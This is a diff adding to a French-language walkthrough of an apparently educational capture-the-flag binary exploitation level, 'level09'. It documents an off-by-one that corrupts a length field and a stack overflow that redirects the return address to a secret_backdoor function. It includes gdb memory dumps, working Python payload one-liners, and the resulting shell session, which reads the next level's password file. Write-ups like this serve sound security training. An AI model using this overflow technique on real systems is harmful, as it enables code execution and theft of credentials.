@@ -30,20 +30,121 @@ Que fait <handle_msg> ?
 
 Que fait <set_username> ?
 
-  Recupère un input via fgets() puis le copie via une boucle dans buffer_username
-  EXPLOIT : Mais la boucle s'incrèmente une fois de plus ce qui nous permet de réécrire len_msg et par consèquent 
+  Recupère le 1er input via fgets() puis le copie via une boucle dans buffer_username
+  EXPLOIT : Mais la boucle s'incrèmente une fois de plus ce qui nous permet de réécrire len_msg
 
 Que fait <set_msg> ?
 
-  Recupère un input via fgets() puis le copie via strncpy() dans buffer_msg
+  Recupère le 2nd input via fgets() puis le copie via strncpy() dans buffer_msg
   EXPLOIT : Mais si len_msg est modifié on peut alors copier jusqu'à X caractères dans buffer_msg 
   
 
 EXPLOIT :
 
-  1) Réécrire len_msg avec "\xff"
-  2) Déterminer l'offset dans <handle_msg>
+  1) Déterminer l'offset dans <handle_msg>
+  2) Réécrire len_msg avec "\xff"
   3) Réécrire l'eip <handle_msg> avec l'adresse de <secret_backdoor>
 
 
+    
+    1) Déterminer l'offset dans <handle_msg>
 
+(gdb) r < <(python -c 'print("A" * 39 )'; python -c 'print("B" * 39 )')
+
+Breakpoint 3, 0x0000555555554924 in handle_msg ()
+(gdb) x/60wx $rbp-0xc0
+0x7fffffffe4c0:	0x42424242	0x42424242	0x42424242	0x42424242     ------------> On voit ici notre 2nd input 0x42424242 qui debute à 0x7fffffffe4c0
+0x7fffffffe4d0:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe4e0:	0x42424242	0x0a424242	0x00000000	0x00000000
+0x7fffffffe4f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe510:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x41414141      -----------> On voit ici notre 1er input 0x41414141 qui debute à 0x7fffffffe54c
+0x7fffffffe550:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe560:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe570:	0x0a414141	0x0000008c	0xffffe590	0x00007fff      -----------> On voit ici notre len_msg 0x0000008c
+0x7fffffffe580:	0xffffe590	0x00007fff	0x55554abd	0x00005555      -----------> On voit ici notre eip qui debute à 0x7fffffffe588 (info frame)
+0x7fffffffe590:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff      
+0x7fffffffe5a0:	0x00000000	0x00000000	0xffffe678	0x00007fff
+
+(gdb) p 0x7fffffffe588 - 0x7fffffffe4c0
+$1 = 200
+
+OFFSET = 200
+
+    2) Réécrire len_msg avec "\xff"
+
+Testons avec "\xb4" :
+
+(gdb) r < <(python -c 'print("A" * 40 + "\xb4" )'; python -c 'print("B" * 39 )')
+
+Breakpoint 3, 0x0000555555554924 in handle_msg ()
+(gdb) x/60wx $rbp-0xc0
+0x7fffffffe4c0:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe4d0:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe4e0:	0x42424242	0x0a424242	0x00000000	0x00000000
+0x7fffffffe4f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe510:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe560:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe570:	0x00000000	0x000000b4	0xffffe590	0x00007fff      -----------> On voit ici notre len_msg 0x000000b4
+0x7fffffffe580:	0xffffe590	0x00007fff	0x55554abd	0x00005555
+0x7fffffffe590:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
+0x7fffffffe5a0:	0x00000000	0x00000000	0xffffe678	0x00007fff
+
+On peut voir que tout le buffer est initialisé d'ou le fait de calculer l'offset avant de modifier "\xff"
+
+
+    3) Réécrire l'eip <handle_msg> avec l'adresse de <secret_backdoor>
+
+(gdb) info function
+0x000055555555488c  secret_backdoor
+
+(gdb) r < <(python -c 'print("A" * 40 + "\xff" )'; python -c 'print("B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")')
+
+Breakpoint 3, 0x0000555555554924 in handle_msg ()
+(gdb) x/60wx $rbp-0xc0
+0x7fffffffe4c0:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe4d0:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe4e0:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe4f0:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe500:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe510:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe520:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe530:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe540:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe550:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe560:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe570:	0x42424242	0x42424242	0x42424242	0x42424242
+0x7fffffffe580:	0x42424242	0x42424242	0x5555488c	0x00005555      -----------> On voit ici notre eip qui debute à été réécrite par 0x000055555555488c 
+0x7fffffffe590:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe5a0:	0x00000000	0x00000000	0x00000000	0x00000000
+
+
+EXPLOIT :
+
+<secret_backdoor> utilise fgets() afin de récupérer une chaine de caractère, qui est ensuite passé en paramétre à system()
+On va donc laisser stdin ouvert avec cat est fournir "/bin/sh"
+
+level09@OverRide:~$ (python -c 'print("A" * 40 + "\xff" )'; python -c 'print("B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+/bin/sh
+id
+uid=1010(level09) gid=1010(level09) euid=1009(end) egid=100(users) groups=1009(end),100(users),1010(level09)
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
+THE END
